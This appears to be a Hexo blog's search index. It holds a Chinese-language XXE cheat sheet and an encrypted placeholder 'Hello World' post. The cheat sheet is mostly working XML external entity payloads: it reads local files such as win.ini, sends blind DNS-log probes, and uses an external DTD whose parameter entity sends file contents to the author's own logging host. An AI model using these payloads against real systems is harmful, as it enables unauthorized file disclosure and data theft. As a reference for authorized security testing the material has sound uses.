<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>xxe</title>
    <url>/2019/12/02/xxe/</url>
    <content><![CDATA[<h1 id="XXE小结"><a href="#XXE小结" class="headerlink" title="XXE小结"></a>XXE小结</h1><p><strong>1、测试是否禁用dtd</strong></p>
<p><code>!DOCTYPE foo</code>  定义此文档是 foo类型的文档</p>
<p><code>!ELEMENT foo ANY</code>  ANY 声明的元素，可包含任何可解析数据的组合 </p>
<p><code>!ENTITY xxe &quot;testXXE&quot;</code>  !ENTITY 实体名称 “实体的值”</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>        </span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE foo [ </span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!ELEMENT foo ANY &gt;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY xxe "testXXE"&gt;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="meta">] &gt;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">foo</span>&gt;</span><span class="tag">&lt;<span class="name">firstname</span>&gt;</span>&amp;xxe;<span class="tag">&lt;/<span class="name">firstname</span>&gt;</span><span class="tag">&lt;<span class="name">lastname</span>&gt;</span>666<span class="tag">&lt;/<span class="name">lastname</span>&gt;</span><span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span></pre></td></tr></table></figure>
<a id="more"></a>


<p><img src="/images/loading.gif" data-original="image-20191128170713993.png" alt="image-20191128170713993"></p>
<p><strong>2、测试是否可回显本地文件</strong></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> <span class="attr">xxe</span> <span class="attr">SYSTEM</span> "<span class="attr">file:</span>///<span class="attr">c:</span>/<span class="attr">windows</span>/<span class="attr">win.ini</span>"&gt;</span> </span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> <span class="attr">xxe</span> <span class="attr">SYSTEM</span> "<span class="attr">file:</span>///<span class="attr">sys</span>/<span class="attr">power</span>/<span class="attr">image_size</span>"&gt;</span>   #payload：无特殊字符，返回只有一行数字</span></pre></td></tr></table></figure>



<p><img src="/images/loading.gif" data-original="image-20191128171532350.png" alt="image-20191128171532350"></p>
<p><strong>3、dnslog盲打</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#用于快速发现是否存在xxe漏洞</span></pre></td></tr><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;        </span></pre></td></tr><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE foo [ </span></pre></td></tr><tr><td class="code"><pre><span class="line">&lt;!ELEMENT foo ANY &gt;</span></pre></td></tr><tr><td class="code"><pre><span class="line">&lt;!ENTITY xxe SYSTEM &quot;http:&#x2F;&#x2F;xxe.test.log.a0xpg.com&quot;&gt;</span></pre></td></tr><tr><td class="code"><pre><span class="line">] &gt;</span></pre></td></tr><tr><td class="code"><pre><span class="line">&lt;foo&gt;&amp;xxe;&lt;&#x2F;foo&gt;</span></pre></td></tr></table></figure>



<p><img src="/images/loading.gif" data-original="image-20191128172004334.png" alt="image-20191128172004334"></p>
<p><strong>4、外部dtd盲打</strong></p>
<p>无回显盲打xxe，用于fileattack测试</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE foo SYSTEM "http://www.a0xpg.com/log.dtd"&gt;</span></span></pre></td></tr></table></figure>

<p><code>注意</code>：特殊字符会破坏URL</p>
<p><a href="http://www.a0xpg.com/log.dtd" target="_blank" rel="noopener">http://www.a0xpg.com/log.dtd</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % payload SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;sys&#x2F;power&#x2F;image_size&quot;&gt;</span></pre></td></tr><tr><td class="code"><pre><span class="line">&lt;!ENTITY % param1 &#39;&lt;!ENTITY &amp;#x25; external SYSTEM &quot;http:&#x2F;&#x2F;xxe.log.a0xpg.com&#x2F;x&#x3D;%payload;&quot;&gt;&#39;&gt; %param1; %external;</span></pre></td></tr></table></figure>



<p><strong>5、支持的协议</strong></p>
<p><img src="/images/loading.gif" data-original="image-20191128181129606.png" alt="image-20191128181129606"></p>
<p><code>tips</code>: java中可以使用netdoc代替file</p>
<p><strong>6、xxe利用</strong></p>
<p>读取多行文件可以使用ftp服务器</p>
]]></content>
  </entry>
  <entry>
    <title>Hello Word - Hexo</title>
    <url>/2019/05/26/hello-world/</url>
    <content><![CDATA[<script src=/js/crypto-js.js></script>
<script>
function doDecrypt (pwd, onError) {
	console.log('in doDecrypt');
	const txt = document.getElementById('enc_content').innerHTML;
	let plantext;
	try {
		const bytes = CryptoJS.AES.decrypt(txt, pwd);
		var plaintext = bytes.toString(CryptoJS.enc.Utf8);
	} catch(err) {
		if(onError) {
			onError(err);
		}
		return;
	}
	document.getElementById('enc_content').innerHTML = plaintext;
	document.getElementById('enc_content').style.display = 'block';
	document.getElementById('enc_passwd').style.display = 'none';
	if(typeof MathJax !== 'undefined') {
		MathJax.Hub.Queue(
			['resetEquationNumbers', MathJax.InputJax.TeX],
			['PreProcess', MathJax.Hub],
			['Reprocess', MathJax.Hub]
		);
	}
}
</script>
<div id="enc_content" style="display:none">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</div>
<div id="enc_passwd"> <input id="enc_pwd_input" type="password" style="border-radius: 5px;border-style: groove;height: 30px;width: 50%;cursor: auto;font-size: 102%;color: currentColor;outline: none;text-overflow: initial;padding-left: 5px;" onkeydown="if (event.keyCode == 13) { decrypt(); return false;}"> <input type="submit" value="解&nbsp;密" onclick="decrypt()" style="width: 58px;height: 34px;border-radius: 5px;background-color: white;border-style: solid;color: currentColor;"><div id="enc_error" style="display: inline-block;color: #d84527;margin-left: 10px"></div>
<script>
var onError = function(error) {
	document.getElementById("enc_error").innerHTML = "password error!"
};
function decrypt() {
var passwd = document.getElementById("enc_pwd_input").value;
console.log(passwd);
doDecrypt(passwd, onError);
}
</script>
</div>]]></content>
      <categories>
        <category>测试</category>
      </categories>
      <tags>
        <tag>hexo</tag>
        <tag>test</tag>
      </tags>
  </entry>
</search>
